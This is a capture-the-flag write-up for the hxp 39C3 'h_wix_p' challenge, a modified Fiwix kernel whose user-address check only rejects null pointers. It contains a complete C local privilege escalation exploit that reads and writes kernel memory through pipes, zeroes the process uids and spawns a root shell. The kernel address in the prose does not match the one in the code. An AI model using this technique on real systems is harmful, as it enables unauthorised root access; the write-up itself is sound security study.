hxp 39C3 CTF
===

I'm a little busy during this CTF, so I only solve `h_wix_p` during the CTF. There are other interesting challenges in this CTF, I will write writeup once I have time to solve them.

h_wix_p
---
It's a customized kernel modified from Fiwix.
https://github.com/mikaku/Fiwix

In sys_read and sys_write, Fiwix call check_user_area().
But in the given binary, it only check `addr != 0`, which means we can read / write kernel memory in user land.
```c
unsigned int __cdecl check_user_area(int a1, int a2)
{
  return a2 == 0 ? 0xFFFFFFF2 : 0;
}
```

looks like they enable `CONFIG_LAZY_USER_ADDR_CHECK`
```c
int check_user_area(int type, const void *addr, unsigned int size)
{
	return verify_address(type, addr, size);
}

static int verify_address(int type, const void *addr, unsigned int size)
{
#ifdef CONFIG_LAZY_USER_ADDR_CHECK
	if(!addr) {
		return -EFAULT;
	}
#else
// ...
}
```

We can overwrite `uid`, `current->uid`, `current->suid` to LPE.

```c
int sys_setuid(__uid_t uid)
{
#ifdef __DEBUG__
	printk("(pid %d) sys_setuid(%d)\n", current->pid, uid);
#endif /*__DEBUG__ */

	if(IS_SUPERUSER) {
		current->uid = current->suid = uid;
	} else {
		if((current->uid != uid) && (current->suid != uid)) {
			return -EPERM;
		}
	}
	current->euid = uid;
	return 0;
}
```
In IDA it looks like this. But when I tried to leak `dword_C0144CF8`, I get 0x0 so I use gdb to check.
There is another symbols call `current` at `0xc0144cf8` and it is the correct address.
```c
int __cdecl sys_setuid(__int16 a1)
{
  int v1; // eax

  v1 = dword_C0144CF8;
  if ( !*(_WORD *)(dword_C0144CF8 + 0x2124) )
  {
    *(_WORD *)(dword_C0144CF8 + 0x2128) = a1;
    *(_WORD *)(v1 + 0x2120) = a1;
LABEL_3:
    *(_WORD *)(v1 + 0x2124) = a1;
    return 0;
  }
  if ( *(_WORD *)(dword_C0144CF8 + 0x2120) == a1 || *(_WORD *)(dword_C0144CF8 + 0x2128) == a1 )
    goto LABEL_3;
  return -1;
}
```

### Exploit
leak current from `0xc0144cf8` and overwrite uids to LPE
Initially I use normal library function to write exploit but the binary crashed in qemu.
So I use assembly in my final exploit
flag : `hxp{Don't panic wixer! it's just a nice hobby and not 🐧} `
```c
// i686-linux-musl-gcc -static -nostdlib -o exp exp.c
static inline int syscall1(int num, int a1) {
    int ret;
    __asm__ volatile("int $0x80" : "=a"(ret) : "a"(num), "b"(a1) : "memory");
    return ret;
}

static inline int syscall2(int num, int a1, int a2) {
    int ret;
    __asm__ volatile("int $0x80" : "=a"(ret) : "a"(num), "b"(a1), "c"(a2) : "memory");
    return ret;
}

static inline int syscall3(int num, int a1, int a2, int a3) {
    int ret;
    __asm__ volatile("int $0x80" : "=a"(ret) : "a"(num), "b"(a1), "c"(a2), "d"(a3) : "memory");
    return ret;
}

#define SYS_read     3
#define SYS_write    4
#define SYS_execve   11
#define SYS_pipe     42  

#define CURRENT_ADDR  0xc0144bf8

#define UID_OFFSET   0x2120
#define EUID_OFFSET  0x2124
#define SUID_OFFSET  0x2128

static inline int sys_read(int fd, void *buf, int count) { return syscall3(SYS_read, fd, (int)buf, count); }
static inline int sys_write(int fd, const void *buf, int count) { return syscall3(SYS_write, fd, (int)buf, count); }
static inline int sys_pipe(int *filedes) { return syscall1(SYS_pipe, (int)filedes); }
static inline int sys_execve(const char *path, char *const argv[], char *const envp[]) {
    return syscall3(SYS_execve, (int)path, (int)argv, (int)envp);
}

void print(const char *s) {
    int len = 0;
    while (s[len]) len++;
    sys_write(1, s, len);
}

unsigned int leak_kernel(unsigned int kaddr) {
    unsigned int value = 0;
    int p[2];

    if (sys_pipe(p) < 0) {
        print("[-] Pipe failed in leak\n");
        return 0;
    }

    sys_write(p[1], (void*)kaddr, 4); 
    sys_read(p[0], &value, 4);

    return value;
}

void write_kernel(unsigned int kaddr, void *data, int size) {
    int p[2];
    
    if (sys_pipe(p) < 0) {
        print("[-] Pipe failed in write\n");
    }

    sys_write(p[1], data, size);
    sys_read(p[0], (void*)kaddr, size);
}

void _start(void) {
    
    unsigned int proc_ptr = leak_kernel(CURRENT_ADDR);
    
    unsigned int uid_addr = proc_ptr + UID_OFFSET;
    unsigned int euid_addr = proc_ptr + EUID_OFFSET;
    unsigned int suid_addr = proc_ptr + SUID_OFFSET;
    
    char zeros[4] = {0};
    
    write_kernel(uid_addr, zeros, 4); 
    write_kernel(euid_addr, zeros, 4);
    write_kernel(suid_addr, zeros, 4);
   
    char *sh = "/bin/sh";
    char *argv[] = {"/bin/sh", (char*)0};
    char *envp[] = {(char*)0};
    sys_execve(sh, argv, envp);
}
```